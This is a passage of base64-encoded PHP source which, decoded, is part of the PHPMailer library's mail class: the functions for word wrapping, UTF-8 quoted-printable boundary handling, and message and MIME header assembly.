hZGRyRm9ybWF0KCRhZGRyKQogICAgewogICAgICAgIGlmIChlbXB0eSgkYWRkclsxXSkpIHsgLy8gTm8gbmFtZSBwcm92aWRlZAogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclswXSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkYWRkclsxXSksICdwaHJhc2UnKSAuICcgPCcgLiAkdGhpcy0+c2VjdXJlSGVhZGVyKAogICAgICAgICAgICAgICAgJGFkZHJbMF0KICAgICAgICAgICAgKSAuICc+JzsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBXb3JkLXdyYXAgbWVzc2FnZS4KICAgICAqIEZvciB1c2Ugd2l0aCBtYWlsZXJzIHRoYXQgZG8gbm90IGF1dG9tYXRpY2FsbHkgcGVyZm9ybSB3cmFwcGluZwogICAgICogYW5kIGZvciBxdW90ZWQtcHJpbnRhYmxlIGVuY29kZWQgbWVzc2FnZXMuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IHBoaWxpcHBlLgogICAgICogQHBhcmFtIHN0cmluZyAkbWVzc2FnZSBUaGUgbWVzc2FnZSB0byB3cmFwCiAgICAgKiBAcGFyYW0gaW50ZWdlciAkbGVuZ3RoIFRoZSBsaW5lIGxlbmd0aCB0byB3cmFwIHRvCiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkcXBfbW9kZSBXaGV0aGVyIHRvIHJ1biBpbiBRdW90ZWQtUHJpbnRhYmxlIG1vZGUKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gd3JhcFRleHQoJG1lc3NhZ2UsICRsZW5ndGgsICRxcF9tb2RlID0gZmFsc2UpCiAgICB7CiAgICAgICAgaWYgKCRxcF9tb2RlKSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gc3ByaW50ZignID0lcycsICR0aGlzLT5MRSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHNvZnRfYnJlYWsgPSAkdGhpcy0+TEU7CiAgICAgICAgfQogICAgICAgIC8vIElmIHV0Zi04IGVuY29kaW5nIGlzIHVzZWQsIHdlIHdpbGwgbmVlZCB0byBtYWtlIHN1cmUgd2UgZG9uJ3QKICAgICAgICAvLyBzcGxpdCBtdWx0aWJ5dGUgY2hhcmFjdGVycyB3aGVuIHdlIHdyYXAKICAgICAgICAkaXNfdXRmOCA9IChzdHJ0b2xvd2VyKCR0aGlzLT5DaGFyU2V0KSA9PSAndXRmLTgnKTsKICAgICAgICAkbGVsZW4gPSBzdHJsZW4oJHRoaXMtPkxFKTsKICAgICAgICAkY3JsZmxlbiA9IHN0cmxlbihzZWxmOjpDUkxGKTsKCiAgICAgICAgJG1lc3NhZ2UgPSAkdGhpcy0+Zml4RU9MKCRtZXNzYWdlKTsKICAgICAgICAvL1JlbW92ZSBhIHRyYWlsaW5nIGxpbmUgYnJlYWsKICAgICAgICBpZiAoc3Vic3RyKCRtZXNzYWdlLCAtJGxlbGVuKSA9PSAkdGhpcy0+TEUpIHsKICAgICAgICAgICAgJG1lc3NhZ2UgPSBzdWJzdHIoJG1lc3NhZ2UsIDAsIC0kbGVsZW4pOwogICAgICAgIH0KCiAgICAgICAgLy9TcGxpdCBtZXNzYWdlIGludG8gbGluZXMKICAgICAgICAkbGluZXMgPSBleHBsb2RlKCR0aGlzLT5MRSwgJG1lc3NhZ2UpOwogICAgICAgIC8vTWVzc2FnZSB3aWxsIGJlIHJlYnVpbHQgaW4gaGVyZQogICAgICAgICRtZXNzYWdlID0gJyc7CiAgICAgICAgZm9yZWFjaCAoJGxpbmVzIGFzICRsaW5lKSB7CiAgICAgICAgICAgICR3b3JkcyA9IGV4cGxvZGUoJyAnLCAkbGluZSk7CiAgICAgICAgICAgICRidWYgPSAnJzsKICAgICAgICAgICAgJGZpcnN0d29yZCA9IHRydWU7CiAgICAgICAgICAgIGZvcmVhY2ggKCR3b3JkcyBhcyAkd29yZCkgewogICAgICAgICAgICAgICAgaWYgKCRxcF9tb2RlIGFuZCAoc3RybGVuKCR3b3JkKSA+ICRsZW5ndGgpKSB7CiAgICAgICAgICAgICAgICAgICAgJHNwYWNlX2xlZnQgPSAkbGVuZ3RoIC0gc3RybGVuKCRidWYpIC0gJGNybGZsZW47CiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlyc3R3b3JkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkc3BhY2VfbGVmdCA+IDIwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHNwYWNlX2xlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDEsIDEpID09ICc9JykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuIC09IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkd29yZCA9IHN1YnN0cigkd29yZCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJyAuICRwYXJ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNwcmludGYoJz0lcycsIHNlbGY6OkNSTEYpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuICRzb2Z0X2JyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAnJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKHN0cmxlbigkd29yZCkgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkbGVuZ3RoIDw9IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkbGVuZ3RoOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGlzX3V0ZjgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gPSAkdGhpcy0+dXRmOENoYXJCb3VuZGFyeSgkd29yZCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4tLTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKHN1YnN0cigkd29yZCwgJGxlbiAtIDIsIDEpID09ICc9JykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRwYXJ0ID0gc3Vic3RyKCR3b3JkLCAwLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOwoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkd29yZCkgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkcGFydCAuIHNwcmludGYoJz0lcycsIHNlbGY6OkNSTEYpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICRwYXJ0OwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkYnVmX28gPSAkYnVmOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICAkYnVmIC49ICcgJzsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAkd29yZDsKCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkYnVmKSA+ICRsZW5ndGggYW5kICRidWZfbyAhPSAnJykgewogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmX28gLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9ICR3b3JkOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRmaXJzdHdvcmQgPSBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICAkbWVzc2FnZSAuPSAkYnVmIC4gc2VsZjo6Q1JMRjsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkbWVzc2FnZTsKICAgIH0KCiAgICAvKioKICAgICAqIEZpbmQgdGhlIGxhc3QgY2hhcmFjdGVyIGJvdW5kYXJ5IHByaW9yIHRvICRtYXhMZW5ndGggaW4gYSB1dGYtOAogICAgICogcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIHN0cmluZy4KICAgICAqIE9yaWdpbmFsIHdyaXR0ZW4gYnkgQ29saW4gQnJvd24uCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RlZFRleHQgdXRmLTggUVAgdGV4dAogICAgICogQHBhcmFtIGludGVnZXIgJG1heExlbmd0aCBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byB0aGlzIGxlbmd0aAogICAgICogQHJldHVybiBpbnRlZ2VyCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB1dGY4Q2hhckJvdW5kYXJ5KCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCkKICAgIHsKICAgICAgICAkZm91bmRTcGxpdFBvcyA9IGZhbHNlOwogICAgICAgICRsb29rQmFjayA9IDM7CiAgICAgICAgd2hpbGUgKCEkZm91bmRTcGxpdFBvcykgewogICAgICAgICAgICAkbGFzdENodW5rID0gc3Vic3RyKCRlbmNvZGVkVGV4dCwgJG1heExlbmd0aCAtICRsb29rQmFjaywgJGxvb2tCYWNrKTsKICAgICAgICAgICAgJGVuY29kZWRDaGFyUG9zID0gc3RycG9zKCRsYXN0Q2h1bmssICc9Jyk7CiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVuY29kZWRDaGFyUG9zKSB7CiAgICAgICAgICAgICAgICAvLyBGb3VuZCBzdGFydCBvZiBlbmNvZGVkIGNoYXJhY3RlciBieXRlIHdpdGhpbiAkbG9va0JhY2sgYmxvY2suCiAgICAgICAgICAgICAgICAvLyBDaGVjayB0aGUgZW5jb2RlZCBieXRlIHZhbHVlICh0aGUgMiBjaGFycyBhZnRlciB0aGUgJz0nKQogICAgICAgICAgICAgICAgJGhleCA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2sgKyAkZW5jb2RlZENoYXJQb3MgKyAxLCAyKTsKICAgICAgICAgICAgICAgICRkZWMgPSBoZXhkZWMoJGhleCk7CiAgICAgICAgICAgICAgICBpZiAoJGRlYyA8IDEyOCkgewogICAgICAgICAgICAgICAgICAgIC8vIFNpbmdsZSBieXRlIGNoYXJhY3Rlci4KICAgICAgICAgICAgICAgICAgICAvLyBJZiB0aGUgZW5jb2RlZCBjaGFyIHdhcyBmb3VuZCBhdCBwb3MgMCwgaXQgd2lsbCBmaXQKICAgICAgICAgICAgICAgICAgICAvLyBvdGhlcndpc2UgcmVkdWNlIG1heExlbmd0aCB0byBzdGFydCBvZiB0aGUgZW5jb2RlZCBjaGFyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRlbmNvZGVkQ2hhclBvcyA+IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICAgICAgICAgICAgfSBlbHNlaWYgKCRkZWMgPj0gMTkyKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gRmlyc3QgYnl0ZSBvZiBhIG11bHRpIGJ5dGUgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgLy8gUmVkdWNlIG1heExlbmd0aCB0byBzcGxpdCBhdCBzdGFydCBvZiBjaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAkbWF4TGVuZ3RoID0gJG1heExlbmd0aCAtICgkbG9va0JhY2sgLSAkZW5jb2RlZENoYXJQb3MpOwogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjIDwgMTkyKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gTWlkZGxlIGJ5dGUgb2YgYSBtdWx0aSBieXRlIGNoYXJhY3RlciwgbG9vayBmdXJ0aGVyIGJhY2sKICAgICAgICAgICAgICAgICAgICAkbG9va0JhY2sgKz0gMzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vIE5vIGVuY29kZWQgY2hhcmFjdGVyIGZvdW5kCiAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRtYXhMZW5ndGg7CiAgICB9CgogICAgLyoqCiAgICAgKiBBcHBseSB3b3JkIHdyYXBwaW5nIHRvIHRoZSBtZXNzYWdlIGJvZHkuCiAgICAgKiBXcmFwcyB0aGUgbWVzc2FnZSBib2R5IHRvIHRoZSBudW1iZXIgb2YgY2hhcnMgc2V0IGluIHRoZSBXb3JkV3JhcCBwcm9wZXJ0eS4KICAgICAqIFlvdSBzaG91bGQgb25seSBkbyB0aGlzIHRvIHBsYWluLXRleHQgYm9kaWVzIGFzIHdyYXBwaW5nIEhUTUwgdGFncyBtYXkgYnJlYWsgdGhlbS4KICAgICAqIFRoaXMgaXMgY2FsbGVkIGF1dG9tYXRpY2FsbHkgYnkgY3JlYXRlQm9keSgpLCBzbyB5b3UgZG9uJ3QgbmVlZCB0byBjYWxsIGl0IHlvdXJzZWxmLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0V29yZFdyYXAoKQogICAgewogICAgICAgIGlmICgkdGhpcy0+V29yZFdyYXAgPCAxKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgewogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9pbmxpbmVfYXR0YWNoJzoKICAgICAgICAgICAgICAgICR0aGlzLT5BbHRCb2R5ID0gJHRoaXMtPndyYXBUZXh0KCR0aGlzLT5BbHRCb2R5LCAkdGhpcy0+V29yZFdyYXApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkdGhpcy0+Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIEFzc2VtYmxlIG1lc3NhZ2UgaGVhZGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHN0cmluZyBUaGUgYXNzZW1ibGVkIGhlYWRlcnMKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGNyZWF0ZUhlYWRlcigpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwoKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdEYXRlJywgJHRoaXMtPk1lc3NhZ2VEYXRlID09ICcnID8gc2VsZjo6cmZjRGF0ZSgpIDogJHRoaXMtPk1lc3NhZ2VEYXRlKTsKCiAgICAgICAgLy8gVG8gYmUgY3JlYXRlZCBhdXRvbWF0aWNhbGx5IGJ5IG1haWwoKQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+dG8gYXMgJHRvYWRkcikgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TaW5nbGVUb0FycmF5W10gPSAkdGhpcy0+YWRkckZvcm1hdCgkdG9hZGRyKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGVsc2VpZiAoY291bnQoJHRoaXMtPmNjKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnRnJvbScsIGFycmF5KGFycmF5KHRyaW0oJHRoaXMtPkZyb20pLCAkdGhpcy0+RnJvbU5hbWUpKSk7CgogICAgICAgIC8vIHNlbmRtYWlsIGFuZCBtYWlsKCkgZXh0cmFjdCBDYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcKICAgICAgICBpZiAoY291bnQoJHRoaXMtPmNjKSA+IDApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQ2MnLCAkdGhpcy0+Y2MpOwogICAgICAgIH0KCiAgICAgICAgLy8gc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IEJjYyBmcm9tIHRoZSBoZWFkZXIgYmVmb3JlIHNlbmRpbmcKICAgICAgICBpZiAoKAogICAgICAgICAgICAgICAgJHRoaXMtPk1haWxlciA9PSAnc2VuZG1haWwnIG9yICR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJyBvciAkdGhpcy0+TWFpbGVyID09ICdtYWlsJwogICAgICAgICAgICApCiAgICAgICAgICAgIGFuZCBjb3VudCgkdGhpcy0+YmNjKSA+IDAKICAgICAgICApIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+YWRkckFwcGVuZCgnQmNjJywgJHRoaXMtPmJjYyk7CiAgICAgICAgfQoKICAgICAgICBpZiAoY291bnQoJHRoaXMtPlJlcGx5VG8pID4gMCkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdSZXBseS1UbycsICR0aGlzLT5SZXBseVRvKTsKICAgICAgICB9CgogICAgICAgIC8vIG1haWwoKSBzZXRzIHRoZSBzdWJqZWN0IGl0c2VsZgogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSkpOwogICAgICAgIH0KCiAgICAgICAgLy8gT25seSBhbGxvdyBhIGN1c3RvbSBtZXNzYWdlIElEIGlmIGl0IGNvbmZvcm1zIHRvIFJGQyA1MzIyIHNlY3Rpb24gMy42LjQKICAgICAgICAvLyBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjNTMyMiNzZWN0aW9uLTMuNi40CiAgICAgICAgaWYgKCcnICE9ICR0aGlzLT5NZXNzYWdlSUQgYW5kIHByZWdfbWF0Y2goJy9ePC4qQC4qPiQvJywgJHRoaXMtPk1lc3NhZ2VJRCkpIHsKICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSAkdGhpcy0+TWVzc2FnZUlEOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0TWVzc2FnZUlEID0gc3ByaW50ZignPCVzQCVzPicsICR0aGlzLT51bmlxdWVpZCwgJHRoaXMtPnNlcnZlckhvc3RuYW1lKCkpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdNZXNzYWdlLUlEJywgJHRoaXMtPmxhc3RNZXNzYWdlSUQpOwogICAgICAgIGlmICghaXNfbnVsbCgkdGhpcy0+UHJpb3JpdHkpKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1gtUHJpb3JpdHknLCAkdGhpcy0+UHJpb3JpdHkpOwogICAgICAgIH0KICAgICAgICBpZiAoJHRoaXMtPlhNYWlsZXIgPT0gJycpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgKICAgICAgICAgICAgICAgICdYLU1haWxlcicsCiAgICAgICAgICAgICAgICAnUEhQTWFpbGVyICcgLiAkdGhpcy0+VmVyc2lvbiAuICcgKGh0dHBzOi8vZ2l0aHViLmNvbS9QSFBNYWlsZXIvUEhQTWFpbGVyKScKICAgICAgICAgICAgKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXlYbWFpbGVyID0gdHJpbSgkdGhpcy0+WE1haWxlcik7CiAgICAgICAgICAgIGlmICgkbXlYbWFpbGVyKSB7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLU1haWxlcicsICRteVhtYWlsZXIpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8gIT0gJycpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnRGlzcG9zaXRpb24tTm90aWZpY2F0aW9uLVRvJywgJzwnIC4gJHRoaXMtPkNvbmZpcm1SZWFkaW5nVG8gLiAnPicpOwogICAgICAgIH0KCiAgICAgICAgLy8gQWRkIGN1c3RvbSBoZWFkZXJzCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPkN1c3RvbUhlYWRlciBhcyAkaGVhZGVyKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoCiAgICAgICAgICAgICAgICB0cmltKCRoZWFkZXJbMF0pLAogICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcih0cmltKCRoZWFkZXJbMV0pKQogICAgICAgICAgICApOwogICAgICAgIH0KICAgICAgICBpZiAoISR0aGlzLT5zaWduX2tleV9maWxlKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ01JTUUtVmVyc2lvbicsICcxLjAnKTsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+Z2V0TWFpbE1JTUUoKTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBtZXNzYWdlIE1JTUUgdHlwZSBoZWFkZXJzLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRNYWlsTUlNRSgpCiAgICB7CiAgICAgICAgJHJlc3VsdCA9ICcnOwogICAgICAgICRpc211bHRpcGFydCA9IHRydWU7CiAgICAgICAgc3dpdGNoICgkdGhpcy0+bWVzc2FnZV90eXBlKSB7CiAgICAgICAgICAgIGNhc2UgJ2lubGluZSc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9taXhlZDsnKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlOycpOwogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gQ2F0Y2hlcyBjYXNlICdwbGFpbic6IGFuZCBjYXNlICcnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoJ0NvbnRlbnQtVHlwZTogJyAuICR0aGlzLT5Db250ZW50VHlwZSAuICc7IGNoYXJzZXQ9JyAuICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgICRpc211bHRpcGFydCA9IGZhbHNlOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIC8vIFJGQzEzNDEgcGFydCA1IHNheXMgN2JpdCBpcyBhc3N1bWVkIGlmIG5vdCBzcGVjaWZpZWQKICAgICAgICBpZiAoJHRoaXMtPkVuY29kaW5nICE9ICc3Yml0JykgewogICAgICAgICAgICAvLyBSRkMgMjA0NSBzZWN0aW9uIDYuNCBzYXlzIG11bHRpcGFydCBNSU1FIHBhcnRzIG1heSBvbmx5IHVzZSA3Yml0LCA4Yml0IG9yIGJpbmFyeSBDVEUKICAgICAgICAgICAgaWYgKCRpc211bHRpcGFydCkgewogICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyA9PSAnOGJpdCcpIHsKICAgICAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJzhiaXQnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFRoZSBvbmx5IHJlbWFpbmluZyBhbHRlcm5hdGl2ZXMgYXJlIHF1b3RlZC1wcmludGFibGUgYW5kIGJhc2U2NCwgd2hpY2ggYXJlIGJvdGggN2JpdCBjb21wYXRpYmxlCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nJywgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21h